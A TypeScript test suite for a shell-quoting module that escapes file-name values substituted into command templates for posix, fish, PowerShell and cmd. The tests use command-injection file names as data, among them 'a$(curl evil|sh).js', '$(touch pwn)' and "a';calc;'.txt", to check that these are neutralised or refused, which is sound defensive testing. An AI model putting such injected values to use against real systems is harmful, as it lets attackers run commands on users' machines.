import * as assert from "assert";
import { ShellKind, quoteForShell, shellKindOf } from "../shellQuote";
import { substitute } from "../variables";

function run(template: string, value: string, kind: ShellKind): string | undefined {
  let failed = false;
  const result = substitute(template, { file: value }, (_name, v, offset) => {
    const quoted = quoteForShell(template, offset, v, kind);
    failed ||= quoted === undefined;
    return quoted ?? v;
  });
  return failed ? undefined : result;
}

suite("Shell quoting", () => {
  test("detects the shell kind", () => {
    assert.strictEqual(shellKindOf("pwsh"), "pwsh");
    assert.strictEqual(shellKindOf("gitbash"), "posix");
    assert.strictEqual(shellKindOf(undefined, "C:\\Windows\\System32\\cmd.exe"), "cmd");
    assert.strictEqual(
      shellKindOf(undefined, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
      "pwsh"
    );
    assert.strictEqual(shellKindOf(undefined, "/usr/bin/fish"), "fish");
    assert.strictEqual(shellKindOf(undefined, "/bin/zsh"), "posix");
  });

  test("leaves plain values alone", () => {
    assert.strictEqual(run("prettier ${file}", "src/a.ts", "posix"), "prettier src/a.ts");
    assert.strictEqual(run("prettier ${file}", "C:\\src\\a.ts", "pwsh"), "prettier C:\\src\\a.ts");
    assert.strictEqual(run("prettier ${file}", "C:\\src\\a.ts", "cmd"), "prettier C:\\src\\a.ts");
  });

  test("posix: command substitution stays text", () => {
    assert.strictEqual(
      run("prettier ${file}", "a$(curl evil|sh).js", "posix"),
      "prettier 'a$(curl evil|sh).js'"
    );
    assert.strictEqual(run("echo ${file}", "it's", "posix"), "echo 'it'\\''s'");
    assert.strictEqual(run('jest "${file}"', "a b$x.ts", "posix"), "jest \"\"'a b$x.ts'\"\"");
    assert.strictEqual(run("jest '${file}'", "it's", "posix"), "jest 'it'\\''s'");
    assert.strictEqual(run("echo ${file}", "", "posix"), "echo ''");
  });

  test("posix: escaped quotes do not open a string", () => {
    assert.strictEqual(run("echo \\\" ${file}", "a b", "posix"), "echo \\\" 'a b'");
  });

  test("fish: backslashes and quotes", () => {
    assert.strictEqual(run("echo ${file}", "a\\'b c", "fish"), "echo 'a\\\\\\'b c'");
    assert.strictEqual(run('echo "${file}"', 'a"$(x)', "fish"), 'echo "a\\"\\$(x)"');
  });

  test("pwsh: single quotes, also typographic ones", () => {
    assert.strictEqual(
      run("prettier ${file}", "a $(rm x) 'b'.js", "pwsh"),
      "prettier 'a $(rm x) ''b''.js'"
    );
    assert.strictEqual(run("echo ${file}", "a\u2019b c", "pwsh"), "echo 'a\u2019\u2019b c'");
    assert.strictEqual(run('echo "${file}"', 'a"$x`', "pwsh"), 'echo "a`"`$x``"');
    assert.strictEqual(run("echo 'it''s ${file}'", "o'k", "pwsh"), "echo 'it''s o''k'");
  });

  test("posix: knows $(...), backticks, $'...' and ${...}", () => {
    const evil = "$(touch pwn)";
    assert.strictEqual(
      run("echo \"$(basename '${file}')\"", evil, "posix"),
      "echo \"$(basename '$(touch pwn)')\""
    );
    assert.strictEqual(
      run('echo "$(basename ${file})"', evil, "posix"),
      "echo \"$(basename '$(touch pwn)')\""
    );
    assert.strictEqual(run("echo `cat ${file}`", evil, "posix"), undefined);
    assert.strictEqual(run("echo `cat ${file}`", "a.txt", "posix"), "echo `cat a.txt`");
    assert.strictEqual(run("echo $'${file}'", evil, "posix"), undefined);
    assert.strictEqual(run('echo "${X:-${file}}"', evil, "posix"), undefined);
    assert.strictEqual(run("cp ${file} ${file}", "a b", "posix"), "cp 'a b' 'a b'");
  });

  test("pwsh: knows $(...) inside double quotes", () => {
    assert.strictEqual(
      run("echo \"$(Get-Item ${file})\"", "a';calc;'.txt", "pwsh"),
      "echo \"$(Get-Item 'a'';calc;''.txt')\""
    );
    assert.strictEqual(run("echo \"$(Get-Item '${file}')\"", "a';calc;'.txt", "pwsh"), undefined);
    assert.strictEqual(run("echo \"$(Get-Item '${file}')\"", "src/a.ts", "pwsh"), "echo \"$(Get-Item 'src/a.ts')\"");
  });

  test("unknown shells take only plain values", () => {
    assert.strictEqual(shellKindOf("csh"), "unknown");
    assert.strictEqual(shellKindOf("nu"), "unknown");
    assert.strictEqual(run("cat ${file}", "src/a.ts", "unknown"), "cat src/a.ts");
    assert.strictEqual(run("cat ${file}", "a b", "unknown"), undefined);
  });

  test("cmd: quotes, and refuses what it cannot escape", () => {
    assert.strictEqual(run("type ${file}", "a b&calc.txt", "cmd"), 'type "a b&calc.txt"');
    assert.strictEqual(run('type "${file}"', "a b&c.txt", "cmd"), 'type "a b&c.txt"');
    assert.strictEqual(run("type ${file}", "%PATH%", "cmd"), undefined);
    assert.strictEqual(run("type ${file}", 'a"&calc', "cmd"), undefined);
    assert.strictEqual(run("type ${file}", "a\nb", "cmd"), undefined);
  });
});
